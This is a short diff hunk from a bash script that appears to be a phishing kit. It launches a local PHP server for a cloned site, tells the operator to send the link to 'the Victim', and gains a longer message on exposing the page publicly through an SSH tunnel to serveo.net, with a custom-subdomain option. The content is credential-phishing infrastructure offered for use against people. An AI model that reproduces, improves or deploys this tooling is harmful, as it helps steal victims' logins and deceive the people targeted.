@@ -420,7 +420,7 @@ printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
 cd  sites/$server && php -S 127.0.0.1:8888 > /dev/null 2>&1 & 
 sleep 2
 printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim (please add port: 8888):\e[0m\e[1;77m %s\e[0m\n" $(hostname -I)
-printf "\e[1;92m[\e[0m*\e[1;92m] Please open another terminal window and run 'ssh 80:127.0.0.1:8888 serveo.net' manualy and give victim that url.\e[0m\e[1;77m %s\e[0m\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] Please open another terminal window and run 'ssh 80:127.0.0.1:8888 serveo.net' manualy and give victim that url. Due to ngrok restriction we are unable to add ngrok url. So, there you go with serveo. If you want custom subdomain just hit command on new window of terminal 'ssh subdomain:80:127.0.0.1:8888 serveo.net' Thank you.\e[0m\e[1;77m %s\e[0m\n"
 checkfound
 }
 
